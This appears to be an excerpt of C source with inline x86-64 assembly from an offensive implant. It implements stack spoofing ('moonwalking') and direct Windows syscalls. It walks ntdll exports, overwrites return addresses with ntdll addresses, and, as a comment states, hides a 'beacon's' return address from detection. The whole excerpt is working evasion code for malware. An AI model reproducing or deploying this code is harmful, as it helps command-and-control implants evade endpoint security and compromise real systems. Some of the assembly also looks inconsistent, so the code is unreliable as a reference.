...
// Get a valid return address from ntdll export table
PVOID get_valid_ntdll_address(Dll* ntdll, DWORD index) {
    // Use ntdll export table to get actual function addresses
    if (!ntdll || !ntdll->Export.AddressTable || ntdll->Export.NumberOfNames == 0) {
        return NULL;
    }

    // Cycle through exports to get different addresses
    DWORD export_index = index % ntdll->Export.NumberOfNames;
    DWORD* function_table = (DWORD*)ntdll->Export.AddressTable;
    DWORD function_rva = function_table[export_index];

    // Calculate actual address
    PVOID function_addr = (BYTE*)ntdll->dllBase + function_rva;

    // Add small offset (5-10 bytes) to point inside function (not at start)
    // This makes it look more like a real return address
    return (BYTE*)function_addr + (5 + (index % 5));
}

// Capture stack frames to spoof - only inactive frames
BOOL capture_stack_snapshot(StackSnapshot* snapshot, PVOID ntdll_base, DWORD max_frames) {
    snapshot->count = 0;

    // Get current RSP to identify active frames
    PVOID current_sp;
    __asm__ volatile("mov %0, rsp" : "=r"(current_sp));

    // Get current RBP to walk the stack
    PVOID* frame_ptr;
    __asm__ volatile("mov %0, rbp" : "=r"(frame_ptr));

    // Parse ntdll to get .text section bounds
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdll_base + dos->e_lfanew);
    PVOID ntdll_start = ntdll_base;
    PVOID ntdll_end = (BYTE*)ntdll_base + nt->OptionalHeader.SizeOfImage;
    ...
    for (DWORD i = 0; i < max_frames && frame_ptr && snapshot->count < MAX_STACK_FRAMES; i++) {
        ...
        // Safety check: ensure we're still in valid stack memory
        if ((PVOID)ret_addr_location < current_sp) {
            break; // Don't go below current stack pointer
        }

        // Skip frames that are too close to current execution (within 0x1000 bytes)
        if ((BYTE*)ret_addr_location < (BYTE*)current_sp + 0x1000) {
            frame_ptr = (PVOID*)*frame_ptr;
            continue;
        }

        // Only spoof return addresses that point OUTSIDE ntdll
        if (ret_addr < ntdll_start || ret_addr >= ntdll_end) {
            snapshot->frame_locations[snapshot->count] = ret_addr_location;
            snapshot->original_addresses[snapshot->count] = ret_addr;

            // Get a valid ntdll function address for spoofing
            // We'll pass ntdll as Dll* later, but for now use the count as seed
            snapshot->spoof_addresses[snapshot->count] = NULL; // Will be filled later
        ...
        // Sanity check: frame must be moving up the stack
        if (next_frame <= frame_ptr || (BYTE*)next_frame > (BYTE*)frame_ptr + 0x10000) {
            break;
        }
...
// Atomic stack spoof, syscall, and restore using inline assembly
// This ensures no interruption between spoof and restore
__attribute__((naked)) NTSTATUS atomic_syscall_with_spoof(
    WORD ssn,                    // rcx
    PVOID syscall_addr,          // rdx
    PVOID spoof_addr,            // r8
    PVOID* frame_location,       // r9
    PVOID arg1,                  // [rsp+0x28]
    PVOID arg2,                  // [rsp+0x30]
    PVOID arg3,                  // [rsp+0x38]
    PVOID arg4,                  // [rsp+0x40]
    ...
    __asm__(
        ...
        "mov r10, [r9]              \n"  // r10 = original return address

        // Replace with spoof address
        "mov [r9], r8               \n"  // *frame_location = spoof_addr

        // Setup syscall
        "mov eax, ecx               \n"  // eax = SSN
        "mov r11, rdx               \n"  // r11 = syscall_addr (save it)

        // Load syscall arguments from stack
        "mov rcx, [rsp+0x28]        \n"  // arg1
        "mov rdx, [rsp+0x30]        \n"  // arg2
        "mov r8,  [rsp+0x38]        \n"  // arg3
        "mov r9,  [rsp+0x40]        \n"  // arg4
        // arg5 stays on stack at [rsp+0x48]

        // Execute syscall via syscall instruction address
        "mov r10, rcx               \n"  // Windows syscall convention
        "jmp r11                    \n"  // Jump to syscall; ret

        // Note: restore happens after syscall returns to our caller
        // The caller will restore the original address
    );
}

// Find a function by name in export table
PVOID get_function_by_name(Dll* dll, const char* function_name) {
    if (!dll || !dll->Export.NameTable || !dll->Export.OrdinalTable ||
        !dll->Export.AddressTable || !function_name) {
        return NULL;
    }

    DWORD* name_table = (DWORD*)dll->Export.NameTable;
    WORD* ordinal_table = (WORD*)dll->Export.OrdinalTable;
    DWORD* function_table = (DWORD*)dll->Export.AddressTable;

    // Search export table for function name
    for (DWORD i = 0; i < dll->Export.NumberOfNames; i++) {
        char* export_name = (char*)((BYTE*)dll->dllBase + name_table[i]);

        // Compare strings
        const char* a = export_name;
        const char* b = function_name;
        while (*a && *b && *a == *b) {
            a++;
            b++;
        }
        ...
        if (*a == *b) {  // Match found
            ...
            return (BYTE*)dll->dllBase + function_rva;
        }
    }
...
// Simple, safe stack moonwalking - only spoof immediate return address
// This hides the beacon's return address during syscall execution
NTSTATUS moonwalk_syscall(
    ...
    NTSTATUS status;
    PVOID original_return_addr;
    PVOID spoof_addr;

    // Use NtClose as our spoof address - it's simple, always available, and safe
    // NtClose is typically at ntdll+0x13370 or similar, but we'll find it dynamically
    Dll ntdll_dll = {0};
    ntdll_dll.dllBase = ntdll_base;
    parse_module_headers(&ntdll_dll);

    // Find NtClose in export table
    spoof_addr = get_function_by_name(&ntdll_dll, "NtClose");
    if (!spoof_addr) {
        // Fallback: use syscall_addr itself (already in ntdll)
        spoof_addr = syscall_addr;
    }

    // Inline assembly to do atomic spoof/syscall/restore
    __asm__ volatile(
        // Save original return address from [rsp]
        "mov (%%rsp), %%r11        \n"  // r11 = [rsp] (original return addr)
        "mov %%r11, %[orig]        \n"  // Save it to variable

        // Replace [rsp] with ntdll spoof address
        "mov %[spoof], (%%rsp)     \n"  // [rsp] = spoof_addr

        // Setup and execute syscall
        "mov %k[ssn], %%eax        \n"  // eax = SSN (use %k for 32-bit)
        "mov %[a1], %%r10          \n"  // r10 = arg1 (Windows syscall convention)
        "mov %[a2], %%rdx          \n"  // rdx = arg2
        "mov %[a3], %%r8           \n"  // r8 = arg3
        "mov %[a4], %%r9           \n"  // r9 = arg4
        // arg5 already on stack at [rsp+0x28]
        "syscall                   \n"

        // Restore original return address
        "mov %[orig], %%r11        \n"  // r11 = original return addr
        "mov %%r11, (%%rsp)        \n"  // [rsp] = original

        : "=a"(status),                  // Output: rax = status
          [orig]"=m"(original_return_addr) // Output: original_return_addr
        : [ssn]"r"((DWORD)ssn),         // Input: SSN
          [spoof]"r"(spoof_addr),        // Spoof address
          [a1]"r"(arg1),
          [a2]"r"(arg2),
          [a3]"r"(arg3),
          [a4]"r"(arg4)
        : "r10", "r8", "r9", "r11", "rdx", "memory"
    );
